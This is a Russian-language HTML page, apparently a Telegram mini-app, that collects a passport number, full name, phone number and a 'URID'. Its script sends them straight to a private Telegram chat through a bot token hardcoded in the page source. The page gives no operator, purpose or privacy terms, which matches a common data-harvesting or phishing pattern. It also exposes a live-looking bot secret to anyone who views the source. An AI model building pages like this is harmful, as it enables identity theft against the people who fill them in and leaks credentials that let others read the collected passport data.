<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Предоставление данных</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root {
      --bg-color: #fff;
      --text-color: #000;
      --input-bg: #fff;
      --input-border: #ccc;
      --input-focus-border: #0088cc;
      --button-bg: #0088cc;
      --button-bg-hover: #006fa1;
      --button-text: #fff;
    }

    body {
      margin: 0;
      padding: 20px 16px 80px; /* padding-bottom для кнопки */
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: var(--bg-color);
      color: var(--text-color);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    h2 {
      font-weight: 600;
      margin-bottom: 24px;
    }

    form {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      gap: 24px;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      position: relative;
    }

    label {
      font-weight: 600;
      font-size: 14px;
      margin-bottom: 6px;
      color: var(--text-color);
      user-select: none;
    }

    input {
      font-size: 16px;
      padding: 10px 12px;
      border: 1.5px solid var(--input-border);
      border-radius: 8px;
      background-color: var(--input-bg);
      color: var(--text-color);
      outline-offset: 2px;
      transition: border-color 0.3s ease, box-shadow 0.3s ease;
    }

    input::placeholder {
      color: #999;
      opacity: 1;
    }

    input:focus {
      border-color: var(--input-focus-border);
      box-shadow: 0 0 6px var(--input-focus-border);
    }

    input[readonly] {
      background-color: #f9f9f9;
      cursor: not-allowed;
    }

    button#submitBtn {
      position: fixed;
      bottom: 12px;
      left: 50%;
      transform: translateX(-50%);
      width: calc(100% - 32px);
      max-width: 400px;
      padding: 14px 0;
      font-size: 18px;
      font-weight: 700;
      background-color: var(--button-bg);
      color: var(--button-text);
      border: none;
      border-radius: 10px;
      cursor: pointer;
      box-shadow: 0 4px 8px rgb(0 136 204 / 0.4);
      transition: background-color 0.3s ease;
      z-index: 100;
    }

    button#submitBtn:hover {
      background-color: var(--button-bg-hover);
    }

    .status {
      margin-top: 12px;
      font-weight: 600;
      font-size: 14px;
      min-height: 22px;
      color: var(--text-color);
    }

    .status.success {
      color: green;
    }

    .status.error {
      color: red;
    }
  </style>
</head>
<body>

<h2>Предоставление данных</h2>

<form id="dataForm" autocomplete="off" novalidate>
  <div class="input-group">
    <label for="passkey">Паспорт</label>
    <input
      type="text"
      id="passkey"
      name="passkey"
      maxlength="11"
      placeholder="0000 000000"
      required
      inputmode="numeric"
      pattern="\d{4} \d{6}"
      title="Формат: 0000 000000"
      autocomplete="off"
      autocorrect="off"
      spellcheck="false"
    />
  </div>
  <div class="input-group">
    <label for="fio">ФИО</label>
    <input
      type="text"
      id="fio"
      name="fio"
      placeholder="Иванов Иван Иванович"
      required
      autocomplete="name"
      autocapitalize="words"
      spellcheck="false"
    />
  </div>
  <div class="input-group">
    <label for="phone">Номер телефона</label>
    <input
      type="tel"
      id="phone"
      name="phone"
      placeholder="+7 999 999 99 99"
      required
      inputmode="tel"
      pattern="\+7\s?\d{3}\s?\d{3}\s?\d{2}\s?\d{2}"
      title="Введите номер в формате +7 999 999 99 99"
      autocomplete="tel"
      autocorrect="off"
      spellcheck="false"
    />
  </div>
  <div class="input-group">
    <label for="urid">URID</label>
    <input
      type="text"
      id="urid"
      name="urid"
      required
      autocomplete="off"
      autocorrect="off"
      spellcheck="false"
    />
  </div>
  <div class="status" aria-live="polite"></div>
</form>

<button id="submitBtn" type="submit" form="dataForm">Отправить</button>

<script>
  const tg = window.Telegram?.WebApp || null;

  function applyThemeColors(theme = {}) {
    const root = document.documentElement;

    root.style.setProperty('--bg-color', theme.bg_color || '#fff');
    root.style.setProperty('--text-color', theme.text_color || '#000');
    root.style.setProperty('--input-bg', theme.bg_color || '#fff');
    root.style.setProperty('--input-border', theme.control_color || '#ccc');
    root.style.setProperty('--input-focus-border', theme.button_color || '#0088cc');
    root.style.setProperty('--button-bg', theme.button_color || '#0088cc');
    root.style.setProperty('--button-bg-hover', theme.button_hover_color || '#006fa1' || '#006fa1');
    root.style.setProperty('--button-text', theme.button_text_color || '#fff');
  }

  if (tg) {
    tg.ready();
    applyThemeColors(tg.themeParams || {});
    tg.onEvent('themeChanged', () => applyThemeColors(tg.themeParams || {}));
  } else {
    applyThemeColors();
  }

  const passInput = document.getElementById('passkey');
  passInput.addEventListener('input', () => {
    let value = passInput.value.replace(/\D/g, '');
    if (value.length > 10) value = value.slice(0, 10);
    if (value.length > 4) {
      value = value.slice(0, 4) + ' ' + value.slice(4);
    }
    passInput.value = value;
  });

  const form = document.getElementById('dataForm');
  const statusDiv = document.querySelector('.status');
  const submitBtn = document.getElementById('submitBtn');

  form.addEventListener('submit', function (e) {
    e.preventDefault();

    const passkey = passInput.value.trim();
    const fio = form.fio.value.trim();
    const phone = form.phone.value.trim();
    const urid = form.urid.value.trim();

    if (!/^\d{4} \d{6}$/.test(passkey)) {
      statusDiv.textContent = 'Неверный формат паспорта. Пример: 1234 567890';
      statusDiv.className = 'status error';
      passInput.focus();
      return;
    }

    if (fio.length < 3) {
      statusDiv.textContent = 'Пожалуйста, введите ФИО полностью.';
      statusDiv.className = 'status error';
      form.fio.focus();
      return;
    }

    if (!/^\+7\s?\d{3}\s?\d{3}\s?\d{2}\s?\d{2}$/.test(phone)) {
      statusDiv.textContent = 'Неверный формат номера телефона. Пример: +7 999 999 99 99';
      statusDiv.className = 'status error';
      form.phone.focus();
      return;
    }

    if (urid.length < 3) {
      statusDiv.textContent = 'Введите корректный URID.';
      statusDiv.className = 'status error';
      form.urid.focus();
      return;
    }

    // Токен и чат из задания
    const botToken = '8112715154:AAG8UTvBi79BvqBB4Cqob95oYgJxbXpgjiY';
    const chatId = '6222585321';

    const message = `Новые данные:
Паспорт: ${passkey}
ФИО: ${fio}
Телефон: ${phone}
URID: ${urid}`;

    submitBtn.disabled = true;
    statusDiv.textContent = 'Отправка данных...';
    statusDiv.className = 'status';

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          statusDiv.textContent = 'Данные успешно отправлены.';
          statusDiv.className = 'status success';
          form.reset();
        } else {
          throw new Error(data.description);
        }
      })
      .catch(err => {
        statusDiv.textContent = 'Ошибка: ' + err.message;
        statusDiv.className = 'status error';
      })
      .finally(() => {
        submitBtn.disabled = false;
      });
  });
</script>

</body>
</html>
